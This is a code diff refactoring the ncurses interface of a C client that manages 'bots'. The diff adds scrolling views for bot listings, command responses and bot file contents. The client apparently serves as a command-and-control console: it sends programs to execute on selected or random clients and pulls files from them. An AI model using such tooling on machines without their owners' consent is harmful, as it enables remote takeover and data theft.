@@ -98,18 +98,18 @@ void *interactive_menu() {
             current_row++; // Move to the next row
         }
 
-        // Get user input
+        refresh();
+
+        // Handle user input
         ch = getch();
-        switch (ch) {
-            case KEY_UP:
-                highlight = (highlight - 1 + NUM_OPTIONS) % NUM_OPTIONS; // Move up
-                break;
-            case KEY_DOWN:
-                highlight = (highlight + 1) % NUM_OPTIONS; // Move down
-                break;
-            case '\n': // Enter key
-                choice = highlight;
-                break;
+        if (ch == 'q') {
+            break; // Exit on 'q'
+        } else if (ch == KEY_UP) {
+            highlight = (highlight - 1 + NUM_OPTIONS) % NUM_OPTIONS; // Move up
+        } else if (ch == KEY_DOWN) {
+            highlight = (highlight + 1) % NUM_OPTIONS; // Move down
+        } else if (ch == '\n') { // Enter key
+            choice = highlight;
         }
 
         // If the user presses Enter, handle the selected option
@@ -139,8 +139,6 @@ void *interactive_menu() {
                         get_bot_file();
                         break;
                 }
-                print_wrapped(NUM_OPTIONS + 8, 0, "Press any key to return to the menu...");
-                getch();
             }
             choice = -1; // Reset choice
         }
@@ -199,45 +197,45 @@ void display_bots() {
         return;
     }
 
-    int current_row = 6; // Start at row 6
+    // Prepare for scrolling
+    int max_y, max_x;
+    getmaxyx(stdscr, max_y, max_x); // Get screen dimensions
+    int start_line = 0;             // Line to start displaying from
+    int total_lines = cJSON_GetArraySize(parsed_json); // Total lines in the response
 
-    // Print the table header
-    print_wrapped(current_row, 0, "%-20s %-20s %-20s", "Socket", "ID", "State");
-    current_row += line_offset; // Adjust for the lines used
-    print_wrapped(current_row, 0, "------------------------------------------------------------");
-    current_row += line_offset; // Adjust for the lines used
+    while (1) {
+        clear();
+        attron(A_BOLD | COLOR_PAIR(3));
+        mvprintw(0, 0, "Connected Bots (Press 'q' to exit):");
+        attroff(A_BOLD | COLOR_PAIR(3));
 
-    // Iterate through the array and print each bot's details
-    cJSON *bot = NULL;
-    int num_bots = 0;
-    cJSON_ArrayForEach(bot, parsed_json) {
-        cJSON *socket_obj = cJSON_GetObjectItem(bot, "socket");
-        cJSON *id_obj = cJSON_GetObjectItem(bot, "id");
-        cJSON *state_obj = cJSON_GetObjectItem(bot, "status");
+        int display_lines = max_y - 2; // Lines available for display (excluding header)
+        for (int i = 0; i < display_lines && (start_line + i) < total_lines; i++) {
+            cJSON *bot = cJSON_GetArrayItem(parsed_json, start_line + i);
+            if (cJSON_IsObject(bot)) {
+                cJSON *socket_obj = cJSON_GetObjectItem(bot, "socket");
+                cJSON *id_obj = cJSON_GetObjectItem(bot, "id");
+                cJSON *state_obj = cJSON_GetObjectItem(bot, "status");
 
-        if (cJSON_IsString(socket_obj) && cJSON_IsString(id_obj) && cJSON_IsString(state_obj)) {
-            print_wrapped(current_row++, 0, "%-20s %-20s %-20s",
-                     socket_obj->valuestring,
-                     id_obj->valuestring,
-                     state_obj->valuestring);
-        } else {
-            attron(A_BOLD | COLOR_PAIR(4));
-            print_wrapped(current_row++, 0, "Failed to parse bot details.");
-            attroff(A_BOLD | COLOR_PAIR(4));
+                if (cJSON_IsString(socket_obj) && cJSON_IsString(id_obj) && cJSON_IsString(state_obj)) {
+                    mvprintw(i + 1, 0, "%-20s %-20s %-20s",
+                             socket_obj->valuestring,
+                             id_obj->valuestring,
+                             state_obj->valuestring);
+                }
+            }
         }
 
-        num_bots++;
+        refresh();
+
+        // Use the reusable input loop for scrolling and quitting
+        if (handle_scrolling_and_quitting(&start_line, total_lines, display_lines)) {
+            break; // Exit if 'q' is pressed
+        }
     }
-
-    if (num_bots == 0) {
-            attron(A_BOLD | COLOR_PAIR(4));
-            print_wrapped(current_row++, 0, "No bots are connected!");
-            attroff(A_BOLD | COLOR_PAIR(4));
-        }
 
     // Free the JSON object
     cJSON_Delete(parsed_json);
-    refresh();
 }
 
 void get_file_from_bot() {
@@ -317,27 +315,30 @@ void get_file_from_bot() {
         return;
     }
 
-    // Check for "status" or "error" in the response
-    cJSON *status_obj = cJSON_GetObjectItem(parsed_json, "status");
-    cJSON *error_obj = cJSON_GetObjectItem(parsed_json, "error");
+    // Display the response
+    int max_y, max_x;
+    getmaxyx(stdscr, max_y, max_x); // Get screen dimensions
+    int start_line = 0;             // Line to start displaying from
+    int total_lines = 1;            // Assume a single-line response for simplicity
 
-    if (cJSON_IsString(status_obj)) {
+    while (1) {
+        clear();
         attron(A_BOLD | COLOR_PAIR(3));
-        print_wrapped(9, 0, "Success!");
+        mvprintw(0, 0, "Upload Response (Press 'q' to exit):");
         attroff(A_BOLD | COLOR_PAIR(3));
-    } else if (cJSON_IsString(error_obj)) {
-        attron(A_BOLD | COLOR_PAIR(4));
-        print_wrapped(9, 0, "Error: %s", error_obj->valuestring);
-        attroff(A_BOLD | COLOR_PAIR(4));
-    } else {
-        attron(A_BOLD | COLOR_PAIR(4));
-        print_wrapped(9, 0, "Unexpected response format.");
-        attroff(A_BOLD | COLOR_PAIR(4));
+
+        mvprintw(1, 0, "%s", response);
+
+        refresh();
+
+        // Use the reusable input loop for scrolling and quitting
+        if (handle_scrolling_and_quitting(&start_line, total_lines, max_y - 2)) {
+            break; // Exit if 'q' is pressed
+        }
     }
 
     // Free the JSON object
     cJSON_Delete(parsed_json);
-    refresh();
 }
 
 void send_command_to_bot() {
@@ -351,53 +352,44 @@ void send_command_to_bot() {
     char post_data[2048];
     char response[4096] = {0}; // Buffer to store the HTTP response
 
-    int current_row = 2; // Start at row 2
-
     // Prompt the user for bot IDs
-    print_wrapped(current_row, 0, "Enter Bot IDs (comma-separated, or leave empty to target random clients): ");
-    current_row += line_offset; // Adjust for the lines used
+    print_wrapped(2, 0, "Enter Bot IDs (comma-separated, or leave empty to target random clients): ");
     echo();
     getnstr(bot_ids, sizeof(bot_ids) - 1);
     noecho();
 
     // Prompt the user for the number of clients to target
-    print_wrapped(current_row, 0, "Enter the number of clients to target (leave empty if using bot IDs): ");
-    current_row += line_offset; // Adjust for the lines used
+    print_wrapped(3, 0, "Enter the number of clients to target (leave empty if using bot IDs): ");
     echo();
     getnstr(num_clients_str, sizeof(num_clients_str) - 1);
     noecho();
 
     // Prompt the user for the command ID
-    print_wrapped(current_row, 0, "Enter Command ID: ");
-    current_row += line_offset; // Adjust for the lines used
+    print_wrapped(4, 0, "Enter Command ID: ");
     echo();
     getnstr(cmd_id, sizeof(cmd_id) - 1);
     noecho();
 
     // Prompt the user for the program to execute
-    print_wrapped(current_row, 0, "Enter Program to Execute: ");
-    current_row += line_offset; // Adjust for the lines used
+    print_wrapped(5, 0, "Enter Program to Execute: ");
     echo();
     getnstr(program, sizeof(program) - 1);
     noecho();
 
     // Prompt the user for parameters
-    print_wrapped(current_row, 0, "Enter Parameters (space-separated, or leave empty): ");
-    current_row += line_offset; // Adjust for the lines used
+    print_wrapped(6, 0, "Enter Parameters (space-separated, or leave empty): ");
     echo();
     getnstr(params, sizeof(params) - 1);
     noecho();
 
     // Prompt the user for the delay
-    print_wrapped(current_row, 0, "Enter Delay (in seconds, or leave empty for 0): ");
-    current_row += line_offset; // Adjust for the lines used
+    print_wrapped(7, 0, "Enter Delay (in seconds, or leave empty for 0): ");
     echo();
     getnstr(delay_str, sizeof(delay_str) - 1);
     noecho();
 
     // Prompt the user for the expected exit code
-    print_wrapped(current_row, 0, "Enter Expected Exit Code (or leave empty for 0): ");
-    current_row += line_offset; // Adjust for the lines used
+    print_wrapped(8, 0, "Enter Expected Exit Code (or leave empty for 0): ");
     echo();
     getnstr(expected_code_str, sizeof(expected_code_str) - 1);
     noecho();
@@ -410,9 +402,8 @@ void send_command_to_bot() {
     CURL *curl = curl_easy_init();
     if (!curl) {
         attron(A_BOLD | COLOR_PAIR(4));
-        print_wrapped(current_row, 0, "Failed to initialize CURL.");
+        print_wrapped(9, 0, "Failed to initialize CURL.");
         attroff(A_BOLD | COLOR_PAIR(4));
-        current_row += line_offset; // Adjust for the lines used
         refresh();
         return;
     }
@@ -427,9 +418,8 @@ void send_command_to_bot() {
     CURLcode res = curl_easy_perform(curl);
     if (res != CURLE_OK) {
         attron(A_BOLD | COLOR_PAIR(4));
-        print_wrapped(current_row, 0, "Failed to send command: %s", curl_easy_strerror(res));
+        print_wrapped(10, 0, "Failed to send command: %s", curl_easy_strerror(res));
         attroff(A_BOLD | COLOR_PAIR(4));
-        current_row += line_offset; // Adjust for the lines used
         refresh();
         curl_easy_cleanup(curl);
         return;
@@ -441,44 +431,36 @@ void send_command_to_bot() {
     cJSON *parsed_json = cJSON_Parse(response);
     if (!parsed_json) {
         attron(A_BOLD | COLOR_PAIR(4));
-        print_wrapped(current_row, 0, "Failed to parse JSON response.");
+        print_wrapped(11, 0, "Failed to parse JSON response.");
         attroff(A_BOLD | COLOR_PAIR(4));
-        current_row += line_offset; // Adjust for the lines used
         refresh();
         return;
     }
 
-    // Check for "status" or "error" in the response
-    cJSON *status_obj = cJSON_GetObjectItem(parsed_json, "status");
-    cJSON *error_obj = cJSON_GetObjectItem(parsed_json, "error");
-    cJSON *targeted_clients_obj = cJSON_GetObjectItem(parsed_json, "targeted_clients");
+    // Display the response
+    int max_y, max_x;
+    getmaxyx(stdscr, max_y, max_x); // Get screen dimensions
+    int start_line = 0;             // Line to start displaying from
+    int total_lines = 1;            // Assume a single-line response for simplicity
 
-    if (cJSON_IsString(status_obj)) {
+    while (1) {
+        clear();
         attron(A_BOLD | COLOR_PAIR(3));
-        print_wrapped(current_row+1, 0, "Success: %s", status_obj->valuestring);
+        mvprintw(0, 0, "Command Response (Press 'q' to exit):");
         attroff(A_BOLD | COLOR_PAIR(3));
-        current_row += line_offset; // Adjust for the lines used
-        if (cJSON_IsNumber(targeted_clients_obj)) {
-            attron(A_BOLD | COLOR_PAIR(3));
-            print_wrapped(current_row+1, 0, "Targeted Clients: %d", targeted_clients_obj->valueint);
-            attroff(A_BOLD | COLOR_PAIR(3));
-            current_row += line_offset; // Adjust for the lines used
+
+        mvprintw(1, 0, "%s", response);
+
+        refresh();
+
+        // Use the reusable input loop for scrolling and quitting
+        if (handle_scrolling_and_quitting(&start_line, total_lines, max_y - 2)) {
+            break; // Exit if 'q' is pressed
         }
-    } else if (cJSON_IsString(error_obj)) {
-        attron(A_BOLD | COLOR_PAIR(4));
-        print_wrapped(current_row, 0, "Error: %s", error_obj->valuestring);
-        attroff(A_BOLD | COLOR_PAIR(4));
-        current_row += line_offset; // Adjust for the lines used
-    } else {
-        attron(A_BOLD | COLOR_PAIR(4));
-        print_wrapped(current_row, 0, "Unexpected response format.");
-        attroff(A_BOLD | COLOR_PAIR(4));
-        current_row += line_offset; // Adjust for the lines used
     }
 
     // Free the JSON object
     cJSON_Delete(parsed_json);
-    refresh();
 }
 
 void get_bot_file() {
@@ -597,22 +579,41 @@ void get_bot_file() {
         return;
     }
 
-    // Display the lines in the CLI
-    attron(A_BOLD | COLOR_PAIR(3));
-    print_wrapped(current_row, 0, "Bot file content:");
-    attroff(A_BOLD | COLOR_PAIR(3));
-    current_row += line_offset; // Adjust for the lines used
-    cJSON *line = NULL;
-    cJSON_ArrayForEach(line, lines_obj) {
-        if (cJSON_IsString(line)) {
-            print_wrapped(current_row, 0, "%s", line->valuestring);
-            current_row += line_offset; // Adjust for the lines used
+    // Prepare for scrolling
+    int max_y, max_x;
+    getmaxyx(stdscr, max_y, max_x); // Get screen dimensions
+    int start_line = 0;             // Line to start displaying from
+    int total_lines = cJSON_GetArraySize(lines_obj); // Total lines in the response
+
+    while (1) {
+        clear();
+        attron(A_BOLD | COLOR_PAIR(3));
+        mvprintw(0, 0, "Bot file content (Press 'q' to exit):");
+        attroff(A_BOLD | COLOR_PAIR(3));
+
+        int display_lines = max_y - 3; // Lines available for display (excluding header and status bar)
+        for (int i = 0; i < display_lines && (start_line + i) < total_lines; i++) {
+            cJSON *line = cJSON_GetArrayItem(lines_obj, start_line + i);
+            if (cJSON_IsString(line)) {
+                mvprintw(i + 1, 0, "%s", line->valuestring);
+            }
+        }
+
+        // Add a status bar at the bottom
+        attron(A_BOLD | COLOR_PAIR(2));
+        mvprintw(max_y - 1, 0, "Press 'q' to exit | Use Arrow Keys to Scroll");
+        attroff(A_BOLD | COLOR_PAIR(2));
+
+        refresh();
+
+        // Use the reusable input loop for scrolling and quitting
+        if (handle_scrolling_and_quitting(&start_line, total_lines, display_lines)) {
+            break; // Exit if 'q' is pressed
         }
     }
 
     // Free the JSON object
     cJSON_Delete(parsed_json);
-    refresh();
 }
 
 void print_wrapped(int start_row, int start_col, const char *format, ...) {
@@ -672,6 +673,28 @@ void get_user_input(int start_row, int start_col, char *buffer, size_t buffer_si
     noecho();
 
     // Calculate the number of lines the user's input occupies
-    int input_lines = calculate_input_lines(buffer, start_col, max_x);
+    int input_lines = calculate_input_lines(buffer, start_row, max_x);
     line_offset += input_lines; // Add the input lines to the global line offset
+}
+
+bool handle_scrolling_and_quitting(int *start_line, int total_lines, int display_lines) {
+    int ch;
+    while (1) {
+        ch = getch();
+        if (ch == 'q') {
+            return true; // Exit on 'q'
+        } else if (ch == KEY_DOWN) {
+            if (*start_line + display_lines < total_lines) {
+                (*start_line)++; // Scroll down
+            }
+        } else if (ch == KEY_UP) {
+            if (*start_line > 0) {
+                (*start_line)--; // Scroll up
+            }
+        } else if (ch == KEY_MOUSE) {
+            // Ignore mouse events to allow text selection
+            continue;
+        }
+        return false; // Continue scrolling
+    }
 }
